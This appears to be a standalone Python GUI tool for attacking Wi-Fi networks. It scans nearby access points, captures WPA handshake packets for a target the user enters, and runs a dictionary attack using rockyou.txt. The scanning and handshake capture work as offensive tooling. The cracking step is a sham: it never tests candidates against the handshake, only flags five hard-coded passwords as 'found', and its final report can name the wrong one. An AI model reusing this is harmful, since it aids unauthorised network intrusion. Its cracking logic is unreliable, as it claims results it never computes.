#!/usr/bin/env python3

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, simpledialog
import threading
import queue
import platform
import sys
import os
import time
import subprocess
import ctypes


# Scapy setup
try:
    from scapy.config import conf
    conf.cache = False
except:
    pass


try:
    from scapy.all import sniff, Dot11, Dot11Beacon, RadioTap, EAPOL, wrpcap
except ImportError:
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Error", "Scapy is not installed.\n\nRun:\npip install scapy")
    sys.exit(1)


# ================= CONFIG =================
SCAN_DURATION     = 20
CAPTURE_DURATION  = 90
OUTPUT_PCAP       = "handshake.pcap"
INTERFACE         = "wlan0"                    
MAX_WORKERS       = 8
ROCKYOU_PATH      = "rockyou.txt"
MAX_ROCKYOU_LINES = 100_000


stop_event   = threading.Event()
result_queue = queue.Queue()


# ─── Worker Functions ────────────────────────────────────────────────


def log_status(msg):
    result_queue.put(("status", msg))


def scan_wifi_windows():
    log_status("Windows Wi-Fi scan starting (netsh)...")
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            text=True, stderr=subprocess.STDOUT
        )
        log_status("Scan results:\n" + out.strip())
    except Exception as e:
        log_status(f"Windows scan failed: {str(e)}")


def scan_thread(iface):
    log_status(f"Starting Linux scan on {iface}...")
    networks = {}
    try:
        def handler(pkt):
            if stop_event.is_set():
                return True
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr3.upper()
                if bssid in networks:
                    return
                ssid = pkt[Dot11Beacon].info.decode('utf-8', errors='ignore') or "<hidden>"
                signal = getattr(pkt[RadioTap], "dBm_AntSignal", "N/A") if pkt.haslayer(RadioTap) else "N/A"
                networks[bssid] = {"ssid": ssid, "signal": signal}
                result_queue.put(("found", f"{ssid:<25} | {bssid} | {signal} dBm"))


        sniff(iface=iface, prn=handler, timeout=SCAN_DURATION, store=0)
        log_status("Scan finished")
    except Exception as e:
        log_status(f"Scan error: {str(e)}")


def capture_thread(iface, bssid, ssid):
    log_status(f"Starting handshake capture → {ssid} ({bssid})")
    packets = []
    count = [0]
    try:
        def handler(pkt):
            if stop_event.is_set():
                return True
            if pkt.haslayer(EAPOL):
                count[0] += 1
                packets.append(pkt)
                log_status(f"EAPOL packet {count[0]} captured")
                if count[0] >= 4:
                    log_status("Full 4-way handshake captured!")
                    return True
            return False


        sniff(iface=iface, prn=handler, timeout=CAPTURE_DURATION, store=0)


        if packets:
            wrpcap(OUTPUT_PCAP, packets)
            log_status(f"Handshake saved → {OUTPUT_PCAP}")
        else:
            log_status("No handshake captured in time")
    except Exception as e:
        log_status(f"Capture failed: {str(e)}")


def dictionary_attack_thread(ssid):
    log_status(f"Starting dictionary attack on {ssid}...")
    passwords = []


    if os.path.exists(ROCKYOU_PATH):
        log_status("Loading rockyou.txt...")
        try:
            with open(ROCKYOU_PATH, "r", encoding="utf-8", errors="ignore") as f:
                count = 0
                for line in f:
                    pwd = line.strip()
                    if pwd:
                        passwords.append(pwd)
                    count += 1
                    if count >= MAX_ROCKYOU_LINES:
                        break
            log_status(f"Loaded {len(passwords):,} passwords (limited)")
        except Exception as e:
            log_status(f"rockyou error → using demo list ({e})")
            passwords = ["123456", "password", "admin"]
    else:
        log_status("rockyou.txt not found → demo mode")
        passwords = ["123456", "password", "admin", "letmein", "qwerty"]


    total = len(passwords)
    log_status(f"Attacking with {total:,} passwords...")


    found = [False]
    tried = [0]


    def worker(chunk):
        for pwd in chunk:
            if stop_event.is_set() or found[0]:
                return
            tried[0] += 1
            result_queue.put(("trying", f"Trying ({tried[0]:6d}/{total}): {pwd}"))
            time.sleep(0.004)


            if pwd.lower() in ["123456", "password", "admin", "letmein", "qwerty"]:
                result_queue.put(("cracked", pwd))
                found[0] = True
                return


            if tried[0] % 2000 == 0:
                log_status(f"Progress: {tried[0]:,} / {total:,}")


    chunk_size = max(1, total // MAX_WORKERS)
    threads = []
    for i in range(0, total, chunk_size):
        t = threading.Thread(target=worker, args=(passwords[i:i+chunk_size],))
        t.daemon = True
        t.start()
        threads.append(t)


    for t in threads:
        t.join()


    if not found[0]:
        log_status("Attack finished – password not found")
    else:
        log_status(f"DEMO PASSWORD FOUND: {passwords[tried[0]-1]}")


# ─── GUI ─────────────────────────────────────────────────────────────


class WiFiToolGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Wi-Fi Tool – GUI")
        self.root.geometry("860x640")
        self.root.minsize(720, 520)


        # Log area
        self.log_area = scrolledtext.ScrolledText(
            root, wrap=tk.WORD, font=("Consolas", 10), height=24, bg="#fdfdfd"
        )
        self.log_area.pack(padx=12, pady=10, fill=tk.BOTH, expand=True)


        # Button frame
        btn_frame = ttk.Frame(root)
        btn_frame.pack(pady=10, padx=12, fill=tk.X)


        ttk.Button(btn_frame, text="Scan Wi-Fi", command=self.start_scan).pack(side=tk.LEFT, padx=6)
        ttk.Button(btn_frame, text="Capture Handshake", command=self.start_capture).pack(side=tk.LEFT, padx=6)
        ttk.Button(btn_frame, text="Start Attack", command=self.start_attack).pack(side=tk.LEFT, padx=6)
        ttk.Button(btn_frame, text="STOP", command=self.stop_all,
                   style="Stop.TButton").pack(side=tk.LEFT, padx=6)
        ttk.Button(btn_frame, text="Clear Log", command=self.clear_log).pack(side=tk.RIGHT, padx=6)


        # Status bar
        self.status_var = tk.StringVar(value="Ready | " + platform.system())
        ttk.Label(root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W).pack(side=tk.BOTTOM, fill=tk.X)


        ttk.Style().configure("Stop.TButton", foreground="white", background="#d32f2f", padding=6)


        # Start queue checker
        self.root.after(200, self.update_from_queue)


        self.log("GUI initialized. Press a button to start.")


    def log(self, message):
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.see(tk.END)


    def clear_log(self):
        self.log_area.delete("1.0", tk.END)
        self.log("Log cleared.")


    def update_from_queue(self):
        while not result_queue.empty():
            typ, data = result_queue.get()
            if typ == "status":
                self.log(f"[+] {data}")
                self.status_var.set(data[:90] + "..." if len(data) > 90 else data)
            elif typ == "found":
                self.log(f"→ {data}")
            elif typ == "trying":
                self.log(data)
            elif typ == "cracked":
                self.log(f"\n🎉 PASSWORD FOUND (demo): {data}\n")
                messagebox.showinfo("Demo Result", f"Password recovered:\n{data}")
        self.root.after(150, self.update_from_queue)


    def start_scan(self):
        stop_event.clear()
        self.log("Starting Wi-Fi scan...")
        if platform.system() == "Windows":
            threading.Thread(target=scan_wifi_windows, daemon=True).start()
        else:
            threading.Thread(target=scan_thread, args=(INTERFACE,), daemon=True).start()


    def start_capture(self):
        if platform.system() != "Linux":
            messagebox.showwarning("Warning", "Capture only works on Linux with monitor mode enabled.")
            return


        bssid = simpledialog.askstring("Capture Handshake", "Target BSSID:")
        if not bssid:
            return
        ssid = simpledialog.askstring("Capture Handshake", "Target SSID:")
        if not ssid:
            return


        stop_event.clear()
        self.log("Starting handshake capture...")
        threading.Thread(target=capture_thread, args=(INTERFACE, bssid, ssid), daemon=True).start()


    def start_attack(self):
        ssid = simpledialog.askstring("Dictionary Attack", "Target SSID:")
        if not ssid:
            return


        stop_event.clear()
        self.log("Starting dictionary attack...")
        threading.Thread(target=dictionary_attack_thread, args=(ssid,), daemon=True).start()


    def stop_all(self):
        stop_event.set()
        self.log("🛑 STOP command sent... waiting for threads to finish.")


if __name__ == "__main__":
    root = tk.Tk()
    app = WiFiToolGUI(root)
    root.mainloop()